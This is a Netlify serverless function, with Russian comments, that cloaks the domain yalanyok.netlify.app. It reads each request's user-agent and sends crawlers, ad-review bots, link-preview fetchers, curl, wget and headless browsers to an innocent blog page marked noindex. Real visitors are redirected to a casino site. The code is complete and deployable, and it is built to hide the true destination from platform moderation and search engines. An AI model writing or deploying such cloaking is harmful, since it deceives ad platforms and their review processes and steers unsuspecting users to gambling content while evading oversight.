// Импорт конфигурации ботов (в твоём случае можно вставить прямо сюда или импортировать)
const BOT_REDIRECTS = {
  meta: {
    url: 'https://www.gamixlabs.com/blog.html',
    status: 302,
    headers: {
      'Cache-Control': 'no-cache, no-store, must-revalidate',
      Pragma: 'no-cache',
      Expires: '0',
      'X-Robots-Tag': 'noindex, nofollow',
    },
  },
  ad: {
    url: 'https://www.gamixlabs.com/blog.html',
    status: 302,
    headers: {
      'Cache-Control': 'no-cache, no-store, must-revalidate',
      Pragma: 'no-cache',
      Expires: '0',
      'X-Robots-Tag': 'noindex, nofollow',
    },
  },
  search: {
    url: 'https://www.gamixlabs.com/blog.html',
    status: 302,
    headers: {
      'Cache-Control': 'no-cache, no-store, must-revalidate',
      Pragma: 'no-cache',
      Expires: '0',
      'X-Robots-Tag': 'noindex, nofollow',
    },
  },
  social: {
    url: 'https://www.gamixlabs.com/blog.html',
    status: 302,
    headers: {
      'Cache-Control': 'no-cache, no-store, must-revalidate',
      Pragma: 'no-cache',
      Expires: '0',
      'X-Robots-Tag': 'noindex, nofollow',
    },
  },
  automation: {
    url: 'https://www.gamixlabs.com/blog.html',
    status: 302,
    headers: {
      'Cache-Control': 'no-cache, no-store, must-revalidate',
      Pragma: 'no-cache',
      Expires: '0',
      'X-Robots-Tag': 'noindex, nofollow',
    },
  },
  script: {
    url: 'https://www.gamixlabs.com/blog.html',
    status: 302,
    headers: {
      'Cache-Control': 'no-cache, no-store, must-revalidate',
      Pragma: 'no-cache',
      Expires: '0',
      'X-Robots-Tag': 'noindex, nofollow',
    },
  },
  default: {
    url: 'https://www.gamixlabs.com/blog.html',
    status: 302,
    headers: {
      'Cache-Control': 'no-cache, no-store, must-revalidate',
      Pragma: 'no-cache',
      Expires: '0',
      'X-Robots-Tag': 'noindex, nofollow',
    },
  },
};

// Простая функция для определения типа бота по user-agent
function detectBotType(userAgent) {
  if (!userAgent) return null;
  userAgent = userAgent.toLowerCase();

  if (userAgent.includes('facebook') || userAgent.includes('meta')) return 'meta';
  if (userAgent.includes('googlebot')) return 'search';
  if (userAgent.includes('adsbot')) return 'ad';
  if (userAgent.includes('twitterbot')) return 'social';
  if (userAgent.includes('slackbot')) return 'social';
  if (userAgent.includes('discordbot')) return 'social';
  if (userAgent.includes('curl')) return 'automation';
  if (userAgent.includes('wget')) return 'automation';
  if (userAgent.includes('headless')) return 'script';
  // Добавь другие варианты при необходимости

  // По умолчанию, если бот не распознан, считаем default
  const botKeywords = [
    'bot', 'crawl', 'spider', 'preview', 'fetch', 'axios', 'httpclient',
  ];
  if (botKeywords.some(k => userAgent.includes(k))) return 'default';

  // Если не бот
  return null;
}

exports.handler = async (event) => {
  const userAgent = event.headers['user-agent'] || '';
  const host = event.headers['host'] || '';

  // Обрабатываем только для yalanyok.netlify.app
  if (host === 'yalanyok.netlify.app') {
    const botType = detectBotType(userAgent);

    if (botType) {
      // Редирект для ботов с заголовками из конфигурации
      const redirectConfig = BOT_REDIRECTS[botType] || BOT_REDIRECTS.default;
      return {
        statusCode: redirectConfig.status,
        headers: {
          Location: redirectConfig.url,
          ...redirectConfig.headers,
        },
      };
    } else {
      // Редирект для реальных пользователей на galaxy-casino.live
      return {
        statusCode: 302,
        headers: {
          Location: 'https://galaxy-casino.live',
        },
      };
    }
  }

  // Для galaxy-casino.live и всех других доменов — отдаём 200, сайт работает нормально
  return {
    statusCode: 200,
    body: '',
  };
};
